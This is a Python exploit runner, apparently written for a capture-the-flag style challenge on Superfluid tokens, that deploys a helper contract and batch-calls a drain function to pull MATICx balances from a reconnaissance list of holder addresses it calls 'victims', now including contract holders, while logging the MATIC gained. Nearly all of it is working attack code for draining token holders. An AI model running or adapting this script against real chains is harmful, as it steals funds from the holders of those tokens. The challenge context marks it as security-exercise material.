#!/usr/bin/env python3
"""Drain contract holders that the NonApp filter skips.
Uses executeSameTokenBatchChecked (without NonApp filter) to try ALL holders including contracts."""
import json
import os
import re
import subprocess
import time
from pathlib import Path

ROOT = Path("/Users/dldustn/Desktop/AssignmentC")
CHAL = ROOT / "challenges" / "ch4_superfluid"
RECON = CHAL / "recon"

RPC = os.environ["RPC_CH4_SUPERFLUID"]
PRIVATE_KEY = os.environ["PRIVATE_KEY"]
PUBLIC_ADDRESS = os.environ["PUBLIC_ADDRESS"]

MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
USDCX = "0xCAa7349CEA390F89641fe306D93591f87595dc1F"
DAIX = "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2"
MIN_BALANCE = 10**15  # 0.001 tokens
BATCH_SIZE = 15  # smaller batches for safety (contracts use more gas)
GAS_LIMIT = 29_000_000


def run(cmd, check=True):
    env = os.environ.copy()
    env["FOUNDRY_DISABLE_NIGHTLY_WARNING"] = "1"
    res = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=str(CHAL))
    out = (res.stdout or "") + (res.stderr or "")
    if check and res.returncode != 0:
        raise RuntimeError(out.strip()[:500])
    return out.strip(), res.returncode


def cast_balance():
    out, _ = run(["cast", "balance", PUBLIC_ADDRESS, "--rpc-url", RPC])
    return int(out.splitlines()[-1], 0)


def parse_tx_hash(text):
    match = re.search(r"0x[a-fA-F0-9]{64}", text)
    return match.group(0) if match else None


def send_tx(to, sig, args, gas_limit=GAS_LIMIT):
    cmd = ["cast", "send", "--async", "--rpc-url", RPC, "--private-key", PRIVATE_KEY,
           "--rpc-timeout", "120", "--gas-limit", str(gas_limit), to, sig] + args
    out, rc = run(cmd, check=False)
    return parse_tx_hash(out), out, rc


def wait_receipt(tx_hash, timeout=300):
    deadline = time.time() + timeout
    while time.time() < deadline:
        out, rc = run(["cast", "receipt", "--json", tx_hash, "--rpc-url", RPC], check=False)
        if rc == 0 and out.strip():
            try:
                data = json.loads(out)
                if data.get("blockNumber") not in (None, "null"):
                    return data
            except json.JSONDecodeError:
                pass
        time.sleep(2)
    raise RuntimeError(f"receipt_timeout {tx_hash}")


def encode_array(addresses):
    return "[" + ",".join(addresses) + "]"


def load_known_victims():
    """Load all addresses already in the proven corpus (victims.json + MATICx rows 1-800 + tail)."""
    known = set()

    # victims.json
    victims = json.loads((RECON / "victims.json").read_text())
    for token in victims.get("tokens", []):
        for v in token.get("victims", []):
            known.add(v["addr"].lower())

    # MATICx rows 1-800
    tsv = (RECON / "tmp_scan" / "maticx_fork24684669_positive_full.tsv").read_text().splitlines()
    for i, line in enumerate(tsv[:800], 1):
        addr = line.split("\t")[0]
        known.add(addr.lower())

    # Tail file
    tail_path = CHAL / "runs" / "maticx_remaining_top5000_after_1776528625.json"
    if tail_path.exists():
        data = json.loads(tail_path.read_text())
        for h in data.get("holders", []):
            known.add(h["addr"].lower())

    return known


def main():
    start_balance = cast_balance()
    print(f"Start balance: {start_balance / 10**18:.2f} MATIC")

    # Deploy helper
    print("Compiling and deploying helper...")
    bytecode, _ = run(["forge", "inspect", "Run", "bytecode"])
    bytecode = bytecode.strip()

    tx_hash, raw, rc = send_tx("", "", [], gas_limit=5_000_000)
    # Actually need to use --create
    cmd = ["cast", "send", "--async", "--rpc-url", RPC, "--private-key", PRIVATE_KEY,
           "--rpc-timeout", "120", "--gas-limit", "5000000", "--create", bytecode]
    out, rc = run(cmd, check=False)
    tx_hash = parse_tx_hash(out)
    if not tx_hash:
        raise RuntimeError(f"Deploy failed: {out[:300]}")

    receipt = wait_receipt(tx_hash)
    helper = receipt.get("contractAddress")
    print(f"Helper deployed: {helper}")

    known = load_known_victims()
    print(f"Known victims (already in corpus): {len(known)}")

    # Load ALL MATICx holders
    tsv = (RECON / "tmp_scan" / "maticx_fork24684669_positive_full.tsv").read_text().splitlines()

    total_gained = 0
    successful_batches = 0
    failed_batches = 0

    # Process MATICx holders that are NOT in known corpus
    unknown_holders = []
    for i, line in enumerate(tsv, 1):
        addr, bal = line.split("\t")
        if addr.lower() not in known and int(bal) > MIN_BALANCE:
            unknown_holders.append(addr)

    print(f"Unknown MATICx holders to try: {len(unknown_holders)}")

    for batch_start in range(0, len(unknown_holders), BATCH_SIZE):
        chunk = unknown_holders[batch_start:batch_start + BATCH_SIZE]

        # Use executeSameTokenBatchChecked (NOT NonApp — tries contracts too!)
        tx_hash, raw, rc = send_tx(
            helper,
            "executeSameTokenBatchChecked(address,address[],uint256)",
            [MATICX, encode_array(chunk), str(MIN_BALANCE)],
            gas_limit=GAS_LIMIT,
        )

        if rc != 0 or not tx_hash:
            failed_batches += 1
            if "no victim drained" in raw or "batch drained nothing" in raw:
                print(f"  batch {batch_start//BATCH_SIZE}: skip (no victims)")
                continue
            print(f"  batch {batch_start//BATCH_SIZE}: send fail")
            continue

        receipt = wait_receipt(tx_hash)
        status = receipt.get("status")
        status_int = int(status, 16) if isinstance(status, str) and status.startswith("0x") else int(status or 0)

        if status_int != 1:
            failed_batches += 1
            continue

        successful_batches += 1
        current = cast_balance()
        batch_gain = current - start_balance - total_gained
        total_gained = current - start_balance
        print(f"  batch {batch_start//BATCH_SIZE}: OK +{batch_gain/10**18:.1f} MATIC (total: +{total_gained/10**18:.1f})")

    final_balance = cast_balance()
    print(f"\n=== DONE ===")
    print(f"Final balance: {final_balance / 10**18:.2f} MATIC")
    print(f"Total gained from contract holders: {total_gained / 10**18:.2f} MATIC")
    print(f"Successful batches: {successful_batches}, Failed: {failed_batches}")


if __name__ == "__main__":
    main()
